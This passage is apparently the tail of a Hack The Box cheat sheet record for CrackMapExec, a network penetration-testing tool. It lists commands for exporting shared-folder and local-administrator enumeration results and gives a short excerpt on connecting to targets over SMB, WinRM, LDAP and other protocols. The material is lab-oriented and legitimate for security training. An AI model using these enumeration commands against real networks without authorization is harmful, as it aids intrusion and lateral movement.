&lt;filename&gt;</code></pre>\n<h3 id=\"export-shared-folders\">Export shared folders.</h3>\n<pre><code class=\"language-bash\">export shares &lt;simple/detailed&gt; &lt;filename&gt;</code></pre>\n<h3 id=\"export-local-admins-information\">Export Local Admins information.</h3>\n<pre><code class=\"language-bash\">export local_admins &lt;simple/detailed&gt; &lt;filename&gt;</code></pre>", "excerpt": "Using CrackMapExec Connecting to Targets Protocol can be smb, winrm, mssql, ldap, ssh, rdp or ftp. cme [protocol] 10.10.10.1 Target can be a DNS, an IP, a file with IPs or DNSs, or CIDR. cme [protocol…", "tags": ["htb", "cheatsheet"]}